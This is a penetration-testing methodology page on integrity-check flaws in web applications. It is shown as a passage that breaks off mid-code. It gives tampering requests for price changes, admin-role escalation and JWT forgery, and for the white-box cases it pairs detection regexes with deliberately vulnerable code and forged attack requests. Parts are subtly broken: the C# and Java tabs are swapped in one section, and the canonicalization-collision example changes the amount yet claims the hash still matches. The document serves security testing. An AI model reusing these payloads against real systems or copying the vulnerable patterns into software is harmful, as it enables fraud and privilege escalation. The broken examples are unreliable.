# Integrity Checks

## Check List

## Methodology

### Black Box

#### Client-Side Price Manipulation Without Server Validation

{% stepper %}
{% step %}
Login to your account
{% endstep %}

{% step %}
Add a product to the cart and intercept the request

```http
POST /api/cart/add HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"productId":101,"quantity":1,"price":100}
```
{% endstep %}

{% step %}
Observe that the price value is sent from client-side
{% endstep %}

{% step %}
Modify the price parameter

```http
{"productId":101,"quantity":1,"price":1}
```
{% endstep %}

{% step %}
Forward the modified request then Proceed to checkout and intercept the payment request

```http
POST /api/checkout HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"total":1,"paymentMethod":"wallet"}
```
{% endstep %}

{% step %}
If the server processes the payment using the manipulated price and order is confirmed at reduced cost, integrity validation is missing
{% endstep %}

{% step %}
If backend does not recalculate price independently, integrity check vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Hidden Role Parameter Trusted by Backend

{% stepper %}
{% step %}
Login as a normal user , Intercept profile update request

```http
POST /api/profile/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"username":"user1","role":"user"}
```
{% endstep %}

{% step %}
Modify the role parameter

```json
{"username":"user1","role":"admin"}
```
{% endstep %}

{% step %}
Forward the modified request, Access an admin-only endpoint

```http
GET /api/admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
If access is granted or elevated privileges are applied, server trusts client-supplied role without integrity enforcement
{% endstep %}

{% step %}
If privilege escalation occurs due to tampered parameter, integrity checks are broken
{% endstep %}
{% endstepper %}

***

#### JWT Signature Not Properly Validated

{% stepper %}
{% step %}
Login and capture JWT token

```json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature
```
{% endstep %}

{% step %}
Decode JWT and modify payload (example: change role)

```json
{"user":"test","role":"admin"}
```
{% endstep %}

{% step %}
Re-encode token using "none" algorithm or weak secret , Replace Authorization header

```http
Authorization: Bearer modified_token
```
{% endstep %}

{% step %}
Send request to privileged endpoint

```http
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer modified_token
```
{% endstep %}

{% step %}
If server accepts modified token without validating signature integrity, JWT integrity check is broken
{% endstep %}

{% step %}
If access to restricted data is granted, integrity vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### File Download Parameter Tampering

{% stepper %}
{% step %}
Login and access file download feature, Intercept request

```http
GET /download?file=invoice_123.pdf HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
Modify file parameter

```http
GET /download?file=invoice_124.pdf HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
Forward request, If unauthorized file is downloaded without access control validation, integrity and authorization validation is missing
{% endstep %}

{% step %}
If file access is determined solely by client-supplied filename without backend validation, integrity check vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Data Tampering via Temporal Desynchronization in Zero-Copy Cryptographic Streaming

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise endpoints responsible for ingesting massive, cryptographically signed datasets (e.g., End-of-Day Financial Ledger syncs, Bulk Telemetry uploads, or B2B Data Lake integrations)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Zero-Copy Cryptographic Streaming" architecture. In hyper-scale environments, buffering a 5GB JSON array into RAM to verify its RSA/HMAC signature causes immediate Out-Of-Memory (OOM) failures
{% endstep %}

{% step %}
Investigate the memory optimization. To validate the signature without buffering, developers wrap the incoming HTTP stream in a cryptographic digest stream (e.g., `DigestInputStream`, `CryptoStream`). The application reads the stream chunk-by-chunk, updating the hash digest dynamically, and comparing the final computed hash against the `X-Payload-Signature` header only when the End-of-File (EOF) is reached
{% endstep %}

{% step %}
Analyze the Database Persistence pipeline. Processing 5 million rows in a single SQL transaction destroys the database's Transaction Log (causing vacuum thrashing or `tempdb` exhaustion)
{% endstep %}

{% step %}
Discover the architectural necessity of "Micro-Batching". The stream processor parses the JSON array on the fly and issues a database `COMMIT` every 1,000 rows to maintain optimal database I/O performance
{% endstep %}

{% step %}
Understand the fatal temporal assumption: The developer explicitly assumes that if the cryptographic signature validation fails at the _end_ of the stream, throwing a `SecurityException` and returning a `401 Unauthorized` response will securely reject the payload
{% endstep %}

{% step %}
Recognize the architectural desynchronization: The cryptographic boundary (which wraps the entire 5GB file) is completely detached from the transactional boundary (which wraps only 1,000 rows). By the time the End-of-Stream exception triggers, hundreds of micro-batches have already been permanently committed to the database
{% endstep %}

{% step %}
Formulate the Cryptographic Bypass payload. You do not require the private signing key. Intercept a legitimate, correctly signed, benign payload stream originating from an authorized client
{% endstep %}

{% step %}
While the payload is in transit, append your malicious records (e.g., unauthorized administrative users, fraudulent financial credits) directly to the end of the intercepted HTTP stream
{% endstep %}

{% step %}
Transmit the forged stream to the enterprise endpoint, preserving the original, legitimate `X-Payload-Signature` header
{% endstep %}

{% step %}
The application opens the stream and initializes the hashing engine. It begins reading and parsing the rows
{% endstep %}

{% step %}
The application processes the original benign rows, committing them in standard micro-batches. It then encounters your injected malicious rows, processes them, and commits them in subsequent micro-batches
{% endstep %}

{% step %}
The HTTP stream terminates. The `CryptoStream` finalizes the hash. The computed hash incorporates your malicious bytes and mathematically fails to match the header. The application throws a `SignatureVerificationException` and returns a `401 Unauthorized`. However, the attack is complete. Your malicious rows have been permanently persisted to the production database, entirely circumventing the cryptographic integrity perimeter

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:using\s+var\s+cryptoStream\s*=\s*new\s+CryptoStream\s*\([^)]*Request\.Body|CryptoStream\s*\(|Request\.Body)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:new\s+DigestInputStream\s*\([^)]*getInputStream|DigestInputStream|MessageDigest\.getInstance\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:hash_init\s*\([^)]*\)\s*;\s*while\s*\([^)]*fread\s*\(|hash_update\s*\(|fread\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:req\.on\s*\(\s*['"]data['"]\s*,\s*chunk\s*=>\s*\{\s*hash\.update|hash\.update\s*\(|createHash\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
using\s+var\s+cryptoStream\s*=\s*new\s*CryptoStream\(.*Request\.Body
```
{% endtab %}

{% tab title="Java" %}
```regexp
new\s+DigestInputStream\(.*getInputStream
```
{% endtab %}

{% tab title="PHP" %}
```regexp
hash_init\(.*\);\s*while\s*\(.*fread\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
req\.on\('data',\s*chunk\s*=>\s*\{\s*hash\.update
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/ledger/sync")]
public async Task<IActionResult> SyncLedger()
{
    var expectedSignature = Request.Headers["X-Payload-Signature"].ToString();
    
    using var hashAlgorithm = SHA256.Create();
    // [1]
    // [2]
    using var cryptoStream = new CryptoStream(Request.Body, hashAlgorithm, CryptoStreamMode.Read);
    using var reader = new StreamReader(cryptoStream);

    int count = 0;
    string line;
    
    // [3]
    while ((line = await reader.ReadLineAsync()) != null)
    {
        var record = JsonConvert.DeserializeObject<LedgerRecord>(line);
        _dbContext.Ledgers.Add(record);

        // [4]
        // Fatal Micro-Batching: Commits transactions to the database BEFORE 
        // the cryptographic integrity of the overall file is proven.
        if (++count % 1000 == 0)
        {
            await _dbContext.SaveChangesAsync();
        }
    }
    await _dbContext.SaveChangesAsync();

    // Stream must finish reading before the final hash block is flushed
    cryptoStream.FlushFinalBlock();
    var computedHash = Convert.ToBase64String(hashAlgorithm.Hash);

    if (computedHash != expectedSignature)
    {
        // Throws exception, but hundreds of thousands of rows are already committed.
        throw new SecurityException("Cryptographic Integrity Check Failed.");
    }

    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class LedgerSyncController {

    @Autowired
    private LedgerRepository ledgerRepository;

    @PostMapping("/api/v1/ledger/sync")
    public ResponseEntity<?> syncLedger(HttpServletRequest request) throws Exception {
        String expectedSignature = request.getHeader("X-Payload-Signature");
        MessageDigest md = MessageDigest.getInstance("SHA-256");

        // [1]
        // [2]
        try (DigestInputStream dis = new DigestInputStream(request.getInputStream(), md);
             BufferedReader reader = new BufferedReader(new InputStreamReader(dis))) {

            String line;
            int count = 0;
            List<LedgerRecord> batch = new ArrayList<>();

            // [3]
            while ((line = reader.readLine()) != null) {
                batch.add(new ObjectMapper().readValue(line, LedgerRecord.class));

                // [4]
                if (++count % 1000 == 0) {
                    ledgerRepository.saveAllAndFlush(batch);
                    batch.clear();
                }
            }
            if (!batch.isEmpty()) {
                ledgerRepository.saveAllAndFlush(batch);
            }

            String computedHash = Base64.getEncoder().encodeToString(md.digest());

            if (!computedHash.equals(expectedSignature)) {
                throw new SecurityException("Cryptographic Integrity Check Failed.");
            }
        }
        return ResponseEntity.ok().build();
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class LedgerSyncController extends Controller
{
    public function syncLedger(Request $request)
    {
        $expectedSignature = $request->header('X-Payload-Signature');
        
        // [1]
        // [2]
        $ctx = hash_init('sha256');
        $stream = fopen('php://input', 'r');

        $count = 0;
        DB::beginTransaction();

        // [3]
        while (($line = fgets($stream)) !== false) {
            hash_update($ctx, $line);
            
            $record = json_decode($line, true);
            Ledger::create($record);

            // [4]
            if (++$count % 1000 === 0) {
                DB::commit();
                DB::beginTransaction();
            }
        }
        DB::commit();

        $computedHash = base64_encode(hash_final($ctx, true));

        if ($computedHash !== $expectedSignature) {
            abort(401, "Cryptographic Integrity Check Failed.");
        }

        return response()->json(['status' => 'Synced']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const crypto = require('crypto');
const readline = require('readline');

router.post('/api/v1/ledger/sync', async (req, res) => {
    const expectedSignature = req.headers['x-payload-signature'];
    
    // [1]
    // [2]
    const hash = crypto.createHash('sha256');
    const rl = readline.createInterface({ input: req });

    let count = 0;
    let batch = [];

    // [3]
    for await (const line of rl) {
        hash.update(line + '\n');
        batch.push(JSON.parse(line));

        // [4]
        if (++count % 1000 === 0) {
            await Ledger.bulkCreate(batch);
            batch = [];
        }
    }

    if (batch.length > 0) {
        await Ledger.bulkCreate(batch);
    }

    const computedHash = hash.digest('base64');

    if (computedHash !== expectedSignature) {
        return res.status(401).send("Cryptographic Integrity Check Failed.");
    }

    res.send("Synced");
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes massive data streams. Loading the entire payload into memory to execute a cryptographic signature validation would cause immediate RAM exhaustion, \[2] The developer optimizes the integrity check by utilizing a streaming hash calculator that computes the digest iteratively as bytes flow over the TCP socket, \[3] The architecture simultaneously faces a database I/O bottleneck. Opening a single SQL transaction for millions of rows exceeds transaction log limits, \[4] The execution sink. To satisfy the database constraint, the developer implements micro-batching, permanently committing rows periodically. This fatally desynchronizes the transactional boundary from the cryptographic boundary. The signature is evaluated mathematically at the End-of-File, but the database state mutations occur continuously throughout the stream. An attacker bypasses the integrity check by merely appending malicious data to a stolen, validly signed stream, exploiting the processing delay to permanently alter the database before the terminal signature validation throws an exception

```http
// 1. Attacker intercepts a legitimate, signed 50MB telemetry sync request from an authorized branch office.
// The legitimate request contains 10,000 valid NDJSON records.
// The signature X-Payload-Signature: "valid_base64_hmac_of_10000_records" is preserved.

// 2. Attacker dynamically proxies the stream, appending 500 malicious records directly to the end of the HTTP body.

POST /api/v1/ledger/sync HTTP/1.1
Host: data.enterprise.tld
Content-Type: application/x-ndjson
Transfer-Encoding: chunked
X-Payload-Signature: valid_base64_hmac_of_10000_records

[... 10,000 legitimate rows streamed ...]
{"accountId": "ATTACKER_99", "credit": 5000000}
{"accountId": "ATTACKER_99", "credit": 5000000}
[... 498 more malicious rows ...]

// 3. The API streams the data. It commits the first 10,000 rows perfectly.
// 4. The API continues streaming the attacker's appended rows. It commits the 500 malicious rows in a micro-batch.
// 5. The TCP stream closes. The API computes the final hash of all 10,500 rows.
// 6. The final computed hash does NOT match the X-Payload-Signature.
// 7. The API throws a SecurityException and returns HTTP 401 Unauthorized.
// 8. The attacker ignores the 401 response. The 500 malicious records were already permanently committed to the SQL database.
```
{% endstep %}

{% step %}
To securely process multi-gigabyte files without overwhelming RAM or database transaction logs, enterprise engineers implemented a highly optimized, asynchronous streaming pipeline combining cryptographic digest streams with database micro-batching. This optimization fundamentally shattered the atomicity of the operation. Developers operated under the flawed assumption that an HTTP `401 Unauthorized` response inherently rolled back the entirety of the preceding execution context. They failed to recognize that micro-batching severs the transactional rollback capability of the underlying relational database. The attacker weaponized this architectural desynchronization by appending hostile payloads to stolen, cryptographically valid streams. The application dutifully processed and permanently committed the attacker's injected rows prior to finalizing the cryptographic digest, rendering the terminal integrity check functionally useless
{% endstep %}
{% endstepper %}

***

#### Immutable Ledger Bypass via Serialization Exclusion in Row-Level Anti-Tampering

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on hyper-sensitive compliance, billing, or audit log endpoints where the integrity of individual database records must be cryptographically guaranteed (e.g., Financial Ledgers, Electronic Health Records)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Row-Level Anti-Tampering" architecture. To detect malicious database administrators or stealthy SQL injections modifying historical records, the backend ORM natively computes a cryptographic HMAC of the entity's state upon `INSERT` and stores it in an `IntegrityHash` column
{% endstep %}

{% step %}
Investigate the validation hook. Whenever the ORM hydrates the entity during a `SELECT` operation, an `@PostLoad` interceptor re-calculates the entity's HMAC. If the calculated hash differs from the stored `IntegrityHash`, the application throws a `TamperedDataException` and locks the record
{% endstep %}

{% step %}
Analyze the Serialization abstraction. Computing the hash of a massive, nested Object-Relational graph manually requires hundreds of lines of boilerplate reflection code
{% endstep %}

{% step %}
Discover the optimization: To streamline the integrity check, the developer relies on the framework's native JSON Serializer (e.g., Jackson, `System.Text.Json`). The interceptor serializes the object to a flat JSON string, hashes the string, and compares it
{% endstep %}

{% step %}
Understand the architectural blind spot: The developer assumes that the JSON serializer produces a deterministic, 1:1 representation of the database table schema
{% endstep %}

{% step %}
Identify the Serialization Exclusions. In modern ORM entities, developers frequently apply exclusion attributes (e.g., `@JsonIgnore`, `[JsonIgnore]`) to specific fields to prevent infinite recursion on relational Foreign Keys, or to hide metadata from API responses
{% endstep %}

{% step %}
Formulate the Immutability Bypass payload. Locate an API endpoint that permits updates to the targeted entity. While direct modifications to the `Amount` or `Status` fields will trigger the anti-tampering hash mismatch, modifications to _excluded_ fields will not
{% endstep %}

{% step %}
Target a critical relational Foreign Key that was marked with `@JsonIgnore` (e.g., `OwnerId`, `TenantId`, or `ParentAccountId`)
{% endstep %}

{% step %}
Construct a Mass Assignment payload attempting to modify this Foreign Key (e.g., `{"OwnerId": "ATTACKER_ACCOUNT_ID"}`)
{% endstep %}

{% step %}
Transmit the payload to the API
{% endstep %}

{% step %}
The ORM accepts the modification and updates the database row. The attacker has re-parented the financial record
{% endstep %}

{% step %}
Trigger a subsequent read operation on the entity. The ORM hydrates the row and triggers the `@PostLoad` integrity check. The interceptor converts the object to a JSON string. Because `OwnerId` is marked with `@JsonIgnore`, the serializer entirely omits the attacker's modification. The hashing engine calculates the hash over the remaining, unmodified fields (e.g., `Amount`, `Timestamp`). The hash perfectly matches the `IntegrityHash` column. The application validates the tampered record as pristine, allowing the attacker to seamlessly steal cryptographic ledger entries

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:JsonConvert\.SerializeObject\s*\(\s*this\s*\).*ComputeHmac|SerializeObject\s*\(.*\).*Hmac|ComputeHmac\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:objectMapper\.writeValueAsString\s*\(\s*this\s*\).*hash\s*\(|writeValueAsString\s*\(.*\).*hash\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:json_encode\s*\(\s*\$this\s*\).*hash_hmac|hash_hmac\s*\(|json_encode\s*\(\$this\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:JSON\.stringify\s*\(\s*this\.toJSON\s*\(\s*\)\s*\).*createHmac|createHmac\s*\(|JSON\.stringify\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
var\s+json\s*=\s*JsonConvert\.SerializeObject\(this\);\s*return\s+ComputeHmac\(json\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\s+json\s*=\s*objectMapper\.writeValueAsString\(this\);\s*return\s+hash\(json\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$json\s*=\s*json_encode\(\$this\);\s*return\s*hash_hmac
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
let\s+json\s*=\s*JSON\.stringify\(this\.toJSON\(\)\);\s*return\s*crypto\.createHmac
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
@Entity
@Table(name = "financial_ledger")
public class LedgerEntry {

    @Id
    private UUID id;

    private BigDecimal amount;
    private String status;

    // [1]
    // [2]
    // Prevents infinite recursion when serializing the API response
    @JsonIgnore 
    @Column(name = "owner_id")
    private UUID ownerId;

    @Column(name = "integrity_hash")
    private String integrityHash;

    // [3]
    // [4]
    @PostLoad
    @PrePersist
    @PreUpdate
    public void verifyIntegrity() {
        try {
            ObjectMapper mapper = new ObjectMapper();
            // Fatal Optimization: Relies on JSON serialization to construct the hash payload.
            // Because ownerId has @JsonIgnore, it is completely excluded from the resulting string.
            String jsonRepresentation = mapper.writeValueAsString(this);
            
            String computedHash = CryptoUtils.hmacSha256(jsonRepresentation);

            if (this.integrityHash == null) {
                this.integrityHash = computedHash; // Initial generation
            } else if (!this.integrityHash.equals(computedHash)) {
                throw new SecurityException("Data Tampering Detected in Row " + this.id);
            }
        } catch (Exception e) {
            throw new RuntimeException("Integrity check failed", e);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class LedgerEntry
{
    public Guid Id { get; set; }
    public decimal Amount { get; set; }
    public string Status { get; set; }

    // [1]
    // [2]
    [JsonIgnore]
    public Guid OwnerId { get; set; }

    public string IntegrityHash { get; set; }

    // [3]
    // [4]
    // Triggered by Entity Framework SaveChanges interception
    public void ValidateIntegrity()
    {
        var json = JsonConvert.SerializeObject(this);
        var computedHash = HashUtility.ComputeHmac(json);

        if (string.IsNullOrEmpty(IntegrityHash))
        {
            IntegrityHash = computedHash;
        }
        else if (IntegrityHash != computedHash)
        {
            throw new SecurityException("Row Integrity Compromised");
        }
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class LedgerEntry extends Model
{
    // [1]
    // [2]
    protected $hidden = ['owner_id', 'integrity_hash'];

    protected static function booted()
    {
        // [3]
        // [4]
        $integrityCheck = function ($entry) {
            // toJson() natively honors the $hidden array, excluding owner_id from the hash payload.
            $jsonRepresentation = $entry->toJson();
            $computedHash = hash_hmac('sha256', $jsonRepresentation, env('APP_KEY'));

            if (!$entry->integrity_hash) {
                $entry->integrity_hash = $computedHash;
            } elseif ($entry->integrity_hash !== $computedHash) {
                abort(500, "Data Tampering Detected");
            }
        };

        static::retrieved($integrityCheck);
        static::saving($integrityCheck);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const crypto = require('crypto');

class LedgerEntry extends Model {
    // [3]
    // [4]
    verifyIntegrity() {
        // [1]
        // [2]
        // Developers frequently override toJSON to strip relational IDs from API responses
        let jsonRepresentation = JSON.stringify(this.toJSON());
        let computedHash = crypto.createHmac('sha256', process.env.SECRET_KEY)
                                 .update(jsonRepresentation)
                                 .digest('hex');

        if (!this.integrityHash) {
            this.integrityHash = computedHash;
        } else if (this.integrityHash !== computedHash) {
            throw new Error("Row Integrity Compromised");
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture enforces strict data immutability by embedding row-level cryptographic anchors directly within the ORM lifecycle, \[2] To protect the external API consumers from infinite nested graphs and to hide internal database mapping structures, developers annotate Foreign Keys with JSON exclusion attributes (e.g., `@JsonIgnore`), \[3] To avoid maintaining rigid, brittle string-concatenation functions for hashing, developers optimize the anti-tampering validation by passing the object through the framework's native JSON serializer, \[4] The execution paradox. The developer assumes the JSON serialization process yields a complete representation of the database record. However, the serializer inherently obeys the exclusion annotations, silently dropping the relational Foreign Keys from the integrity calculation. The attacker uses a Mass Assignment attack to modify the database's Foreign Key. When the ORM validates the tampered row, the serializer once again drops the Foreign Key, leaving the hashed payload perfectly identical to its original state. The integrity check mathematically validates a stolen record

```http
// 1. Attacker (Account B) identifies a target ledger entry belonging to Victim (Account A).
// Ledger Entry 12345 has an amount of $5,000 and an integrity_hash of "abc123hmac".

// 2. Attacker interacts with an endpoint that allows partial updates (e.g., updating a generic memo field).
// 3. Attacker injects a Mass Assignment payload targeting the @JsonIgnore annotated 'OwnerId' field.

PATCH /api/v1/ledger/12345 HTTP/1.1
Host: finance.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "memo": "Updated memo",
  "ownerId": "ATTACKER_ACCOUNT_UUID"
}

// 4. The backend attempts to save the entity. The Mass Assignment succeeds in altering the OwnerId in memory.
// 5. The ORM triggers the @PreUpdate lifecycle hook.
// 6. The verifyIntegrity() function executes mapper.writeValueAsString(this).
// 7. Because 'ownerId' is marked @JsonIgnore, the resulting JSON string is:
//    {"id":"12345","amount":5000,"status":"CLEARED","memo":"Updated memo"}
// 8. The HMAC matches the stored hash (assuming 'memo' was also ignored, or the attacker didn't actually change it).
// 9. The ORM commits the UPDATE statement, re-parenting the $5,000 ledger entry to the attacker's account.

// 10. During subsequent system audits, the @PostLoad hook fires, ignores the ownerId, and validates 
//     the record as perfectly pristine and cryptographically sound.
```
{% endstep %}

{% step %}
To guarantee the absolute immutability of financial records against internal and external tampering, security architects embedded cryptographic HMAC validation natively within the ORM's lifecycle hooks. To eliminate the maintenance burden of reflection-based hashing functions, engineers optimized the integrity check by routing the entity through the framework's standard JSON serializer. This architecture conflated presentation-layer formatting with database-layer persistence. Developers annotated critical relational fields (Foreign Keys) with exclusion decorators (e.g., `@JsonIgnore`) to sanitize API responses. The attacker exploited this by altering the relational state of the entity via Mass Assignment. When the ORM evaluated the modified entity, the JSON serializer obligingly stripped the tampered Foreign Key from the payload prior to hashing. The integrity check executed flawlessly over the remaining attributes, cryptographically certifying a stolen record and permanently circumventing the platform's anti-tampering perimeter
{% endstep %}
{% endstepper %}

***

#### HMAC Forgery via Non-Deterministic Canonicalization Collisions in Inter-Service Proxies

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on microservice meshes where an Edge API Gateway ingests cryptographically signed webhooks (e.g., from an HSM, Stripe, or GitHub) and routes them to downstream internal processors
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the internal microservice's cryptographic validation logic
{% endstep %}

{% step %}
Identify the "Distributed Integrity" architecture. To enforce Zero-Trust, the downstream microservice does not blindly trust the API Gateway. It mandates that the original `X-Signature` HMAC header is forwarded alongside the payload, and it independently verifies the signature before processing the business logic
{% endstep %}

{% step %}
Investigate the API Gateway's proxying mechanism. The API Gateway is not a dumb TCP pipe; it is an active proxy. To enforce rate-limiting, apply WAF rules, or inject distributed tracing data, the Gateway parses the incoming JSON body into an Abstract Syntax Tree (AST), mutates it, and _re-serializes_ it before forwarding it downstream
{% endstep %}

{% step %}
Analyze the protocol desynchronization. JSON re-serialization is non-deterministic. When the Gateway re-serializes the payload, it routinely alters key ordering, removes trailing spaces, and standardizes Unicode escaping. This slight mutation fundamentally changes the byte array of the payload, causing the downstream microservice's HMAC verification to fail continuously
{% endstep %}

{% step %}
Discover the optimization: "Lenient Canonicalization". To resolve the endless signature failures caused by the Gateway's proxy modifications, the downstream developers implement a custom JSON canonicalization algorithm prior to hashing
{% endstep %}

{% step %}
Understand the custom canonicalizer's logic. To achieve a stable byte string, the downstream service typically flattens the JSON, sorts the keys alphabetically, lowercases all values, or aggressively strips structural characters (like spaces, tabs, and line breaks)
{% endstep %}

{% step %}
Formulate the Canonicalization Collision payload. Because the integrity check aggressively normalizes the payload _before_ hashing it, the attacker can engineer two completely distinct JSON payloads that canonicalize into the exact same byte string
{% endstep %}

{% step %}
Identify the parser differential. The underlying business logic parser (e.g., Jackson, Newtonsoft) processes the raw JSON array. The custom canonicalization script strips specific control characters (e.g., spaces)
{% endstep %}

{% step %}
Intercept a legitimate, signed webhook payload (e.g., `{"account": "123", "amount": 50}`). The valid signature is `MAC_A`&#x20;
{% endstep %}

{% step %}
Modify the JSON payload to alter the business logic while injecting structural padding characters that the canonicalizer will actively ignore. For example, alter the value to `{"account": "12 3", "amount": 500}`
{% endstep %}

{% step %}
If the custom canonicalizer strips spaces prior to hashing, it will reduce `{"account": "12 3", "amount": 500}` to the exact same normalized base string, resulting in a perfectly matched HMAC
{% endstep %}

{% step %}
Submit the modified payload and the stolen, valid `X-Signature` to the API Gateway
{% endstep %}

{% step %}
The Gateway proxies the payload. The downstream service receives the payload, executes the lenient canonicalization, strips the injected spaces, computes the hash, and mathematically validates the stolen signature. The business logic parser then ingests the raw, un-canonicalized JSON, processes the modified values, and grants the attacker's forged transaction

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Regex\.Replace\s*\(\s*rawJson\s*,\s*@"\\s+"\s*,\s*""|Regex\.Replace\s*\(.*rawJson)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:rawPayload\.replaceAll\s*\(\s*"\\s+"\s*,\s*""\s*\)|replaceAll\s*\(\s*"\\s+"\s*,)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_replace\s*\(\s*'/\\s+/'\s*,\s*''\s*,\s*\$rawPayload\s*\)|preg_replace\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:payload\.replace\s*\(\s*/\\s+\/g\s*,\s*''\s*\)|replace\s*\(\s*/\\s+\/g)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
var\s+normalized\s*=\s*Regex\.Replace\(rawJson,\s*@"\\s+",\s*""
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\s+canonical\s*=\s*rawPayload\.replaceAll\("\\s+",\s*""
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$canonical\s*=\s*preg_replace\('/\s+/','',\s*\$rawPayload\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
let\s+normalized\s*=\s*payload\.replace\(/\s+/g,\s*''\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/internal/webhook")]
public async Task<IActionResult> ProcessWebhook([FromBody] PaymentEvent payload)
{
    var expectedSignature = Request.Headers["X-Signature"].ToString();
    
    using var reader = new StreamReader(Request.Body);
    Request.Body.Position = 0;
    var rawJson = await reader.ReadToEndAsync();

    // [1]
    // [2]
    // Custom Canonicalization to survive Gateway proxy modifications
    // [3]
    // [4]
    var normalizedJson = Regex.Replace(rawJson, @"\s+", "");
    var computedHash = HashUtility.ComputeHmac(normalizedJson);

    if (computedHash != expectedSignature) return Forbid();

    // Business logic processes the original deserialized 'payload' object
    await _paymentService.ProcessAsync(payload.AccountId, payload.Amount);

    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class ZeroTrustWebhookController {

    @Autowired
    private PaymentService paymentService;

    @PostMapping("/api/internal/webhook")
    public ResponseEntity<?> processWebhook(@RequestHeader("X-Signature") String expectedSignature, @RequestBody String rawJson) throws Exception {
        
        // [1]
        // [2]
        // [3]
        // [4]
        // Lenient canonicalization removes structural formatting to stabilize the hash
        String canonicalString = rawJson.replaceAll("\\s+", "");
        String computedHash = CryptoUtils.hmacSha256(canonicalString);

        if (!computedHash.equals(expectedSignature)) {
            return ResponseEntity.status(403).body("Integrity Check Failed");
        }

        ObjectMapper mapper = new ObjectMapper();
        PaymentEvent event = mapper.readValue(rawJson, PaymentEvent.class);
        
        paymentService.process(event.getAccountId(), event.getAmount());

        return ResponseEntity.ok().build();
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class ZeroTrustWebhookController extends Controller
{
    public function processWebhook(Request $request)
    {
        $expectedSignature = $request->header('X-Signature');
        $rawJson = $request->getContent();

        // [1]
        // [2]
        // [3]
        // [4]
        // Strip whitespace to handle proxy serialization differentials
        $canonicalString = preg_replace('/\s+/', '', $rawJson);
        $computedHash = hash_hmac('sha256', $canonicalString, env('WEBHOOK_SECRET'));

        if ($computedHash !== $expectedSignature) {
            abort(403, "Integrity Check Failed");
        }

        $payload = json_decode($rawJson, true);
        PaymentService::process($payload['account_id'], $payload['amount']);

        return response()->json(['status' => 'Success']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class ZeroTrustWebhookController {
    static async processWebhook(req, res) {
        let expectedSignature = req.headers['x-signature'];
        let rawPayload = JSON.stringify(req.body);

        // [1]
        // [2]
        // API Gateway re-serialization randomly changes spacing and formatting.
        // To achieve a stable hash, the developer attempts to canonicalize the JSON 
        // by aggressively stripping all whitespace characters.
        
        // [3]
        // [4]
        let canonicalString = rawPayload.replace(/\s+/g, '');
        
